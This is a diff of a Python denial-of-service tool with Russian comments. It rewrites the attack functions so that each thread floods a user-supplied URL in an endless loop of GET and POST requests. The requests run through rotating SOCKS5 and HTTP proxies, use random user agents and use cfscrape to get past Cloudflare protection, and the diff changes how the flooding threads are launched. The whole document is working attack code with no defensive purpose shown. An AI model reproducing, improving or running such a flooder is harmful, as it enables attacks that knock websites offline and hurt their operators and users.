@@ -45,52 +45,54 @@ os.remove("proxysocks")
 
 # Аттака
 def dos1_1(target, proxy):
-    s = cfscrape.create_scraper()
+    while True:
+        s = cfscrape.create_scraper()
 
-    useragent = random.choice(headersp)
-    header = {'accept': '*/*', 'user-agent': useragent}
+        useragent = random.choice(headersp)
+        header = {'accept': '*/*', 'user-agent': useragent}
 
-    useragent2 = random.choice(headersp)
-    header2 = {'accept': '*/*', 'user-agent': useragent2}
+        useragent2 = random.choice(headersp)
+        header2 = {'accept': '*/*', 'user-agent': useragent2}
 
-    proxiessockshttp = {
-        'http': f'socks5://{proxy}',
-        'https': f'socks5://{proxy}'
-    }
+        proxiessockshttp = {
+            'http': f'socks5://{proxy}',
+            'https': f'socks5://{proxy}'
+        }
 
-    try:
-        s.get(target, headers=header, proxies=proxiessockshttp, timeout=1)
-    except:
-        pass
+        try:
+            s.get(target, headers=header, proxies=proxiessockshttp, timeout=1)
+        except:
+            pass
 
-    try:
-        s.post(target, headers=header2, proxies=proxiessockshttp, timeout=1)
-    except:
-        pass
+        try:
+            s.post(target, headers=header2, proxies=proxiessockshttp, timeout=1)
+        except:
+            pass
 
 def dos1_2(target, proxy):
-    s = cfscrape.create_scraper()
+    while True:
+        s = cfscrape.create_scraper()
 
-    useragent = random.choice(headersp)
-    header = {'accept': '*/*', 'user-agent': useragent}
+        useragent = random.choice(headersp)
+        header = {'accept': '*/*', 'user-agent': useragent}
 
-    useragent2 = random.choice(headersp)
-    header2 = {'accept': '*/*', 'user-agent': useragent2}
+        useragent2 = random.choice(headersp)
+        header2 = {'accept': '*/*', 'user-agent': useragent2}
 
-    proxieshttphttp = {
-        'http': f'http://{proxy}',
-        'https': f'http://{proxy}'
-    }
+        proxieshttphttp = {
+            'http': f'http://{proxy}',
+            'https': f'http://{proxy}'
+        }
 
-    try:
-        s.get(target, headers=header, proxies=proxieshttphttp, timeout=1)
-    except:
-        pass
+        try:
+            s.get(target, headers=header, proxies=proxieshttphttp, timeout=1)
+        except:
+            pass
 
-    try:
-        s.post(target, headers=header2, proxies=proxieshttphttp, timeout=1)
-    except:
-        pass
+        try:
+            s.post(target, headers=header2, proxies=proxieshttphttp, timeout=1)
+        except:
+            pass
 
 
 def dos2(target):
@@ -144,15 +146,13 @@ if not url.__contains__("."):
 proxyuseage = int(input("Use a proxy?[1-yes; 2-no]: "))
 print("")
 
+print(colorama.Fore.YELLOW + "Запуск потоков...")
 if proxyuseage == 1:
-    print(colorama.Fore.GREEN + "Аттака запущена!")
-    print(Style.RESET_ALL)
-    threading.Thread(target=info)
-    while True:
-        for number_socks in proxy_http:
-            threading.Thread(target=dos1_1, args=(url, number_socks,)).start()
-        for number_http in proxy_socks:
-            threading.Thread(target=dos1_2, args=(url, number_http,)).start()
+    for number_socks in proxy_http:
+        threading.Thread(target=dos1_1, args=(url, number_socks,)).start()
+    for number_http in proxy_socks:
+        threading.Thread(target=dos1_2, args=(url, number_http,)).start()
 else:
     while True:
         threading.Thread(target=dos2, args=(url,)).start()
+print(colorama.Fore.GREEN + "Все потоки запущены!")
